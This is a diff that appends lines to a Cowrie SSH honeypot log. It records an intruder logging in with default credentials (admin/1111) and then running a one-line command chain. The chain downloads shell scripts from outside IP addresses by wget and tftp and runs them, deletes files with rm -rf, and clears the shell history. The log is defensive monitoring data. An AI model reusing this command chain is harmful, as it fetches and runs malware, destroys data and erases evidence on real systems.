@@ -4268,3 +4268,44 @@
 2017-02-26T17:17:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2398,210.94.133.54] login attempt: 5
 2017-02-26T17:17:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2398,210.94.133.54] login return, expect: [admin/1111]
 2017-02-26T17:17:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2398,210.94.133.54] login attempt [admin/1111] succeeded
+2017-02-26T17:17:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2398,210.94.133.54] 'admin' authenticated with 'password'
+2017-02-26T17:17:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,2398,210.94.133.54] starting service 'ssh-connection'
+2017-02-26T17:17:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] got channel 'session' request
+2017-02-26T17:17:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] channel open
+2017-02-26T17:17:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.30.46/nigs.sh; chmod 777 nigs.sh; sh nigs.sh; tftp 90.156.141.203 -c get tlmao1.sh; chmod 777 tlmao1.sh; sh tlmao1.sh; tftp -r tlmao2.sh -g 90.156.141.203; chmod 777 tlmao2.sh; sh tlmao2.sh; rm -rf *;history -c"
+2017-02-26T17:17:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] Opening TTY Log: log/tty/20170226-171703-c7fd1e9c-0e.log
+2017-02-26T17:17:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.30.46/nigs.sh; chmod 777 nigs.sh; sh nigs.sh; tftp 90.156.141.203 -c get tlmao1.sh; chmod 777 tlmao1.sh; sh tlmao1.sh; tftp -r tlmao2.sh -g 90.156.141.203; chmod 777 tlmao2.sh; sh tlmao2.sh; rm -rf *;history -c
+2017-02-26T17:17:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] Command found: cd /tmp
+2017-02-26T17:17:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] Command found: cd /var/run
+2017-02-26T17:17:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] Command found: cd /mnt
+2017-02-26T17:17:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] Command found: cd /root
+2017-02-26T17:17:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] Command found: cd /
+2017-02-26T17:17:03+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,2398,210.94.133.54] Command found: wget http://185.165.30.46/nigs.sh
+2017-02-26T17:17:03+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.30.46/nigs.sh>
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.30.46/nigs.sh) with SHA-256 802b4982eb0ca8f8c6795bb3aa8854155d95bcb4ee4f0b0c917617d10017385b to dl/802b4982eb0ca8f8c6795bb3aa8854155d95bcb4ee4f0b0c917617d10017385b
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Command found: chmod 777 /nigs.sh
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Command found: sh /nigs.sh
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Command found: tftp 90.156.141.203 -c get tlmao1.sh
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Command found: chmod 777 tlmao1.sh
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Command found: sh tlmao1.sh
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Command found: tftp -r tlmao2.sh -g 90.156.141.203
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Command found: chmod 777 tlmao2.sh
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Command found: sh tlmao2.sh
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev /nigs.sh
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Command found: history -c
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Not storing duplicate content 802b4982eb0ca8f8c6795bb3aa8854155d95bcb4ee4f0b0c917617d10017385b
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 802b4982eb0ca8f8c6795bb3aa8854155d95bcb4ee4f0b0c917617d10017385b to dl/802b4982eb0ca8f8c6795bb3aa8854155d95bcb4ee4f0b0c917617d10017385b
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170226-171703-c7fd1e9c-0e.log after 0 seconds
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-02-26T17:17:03+0000 [HTTPPageDownloader,client] sending close 0
+2017-02-26T17:17:03+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.30.46/nigs.sh>
+2017-02-26T17:17:04+0000 [HoneyPotSSHTransport,2398,210.94.133.54] avatar admin logging out
+2017-02-26T17:17:04+0000 [HoneyPotSSHTransport,2398,210.94.133.54] connection lost
+2017-02-26T17:17:04+0000 [HoneyPotSSHTransport,2398,210.94.133.54] Connection lost after 5 seconds
+2017-02-26T17:17:20+0000 [CowrieTelnetTransport,2463,185.2.82.6] Closing TTY Log: log/tty/20170226-171516-None-2463i.log after 124 seconds
+2017-02-26T17:17:20+0000 [CowrieTelnetTransport,2463,185.2.82.6] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-02-26T17:17:20+0000 [CowrieTelnetTransport,2463,185.2.82.6] Connection lost after 130 seconds
